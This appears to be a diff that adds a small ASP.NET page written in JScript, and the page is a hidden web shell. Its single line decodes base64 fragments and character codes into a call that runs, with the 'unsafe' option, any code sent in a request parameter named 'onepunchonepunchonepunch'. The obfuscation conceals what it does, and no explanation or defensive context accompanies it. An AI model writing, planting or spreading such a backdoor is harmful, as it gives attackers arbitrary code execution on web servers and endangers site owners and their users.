@@ -1,0 +1,3 @@
+
+<%@Page Language="Jscript"%>
+<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Mjc4N'+'TczO3'+'ZhciB'+'zYWZl'+''+char(0115520/0761)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Uw=='))+'J'+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+char(0x120a4/0x2f2)+''+''+'n'+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Tg=='))+'h'+char(0x10c-0xb2)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('bQ=='))+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydv'+'bmVwd'+'W5jaG'+'9uZXB'+'1bmNo'+'b25lc'+'HVuY2'+'gnXSw'+'gc2Fm'+'ZSk7O'+'DM1Nz'+'E5Ow='+'='+'')));%>
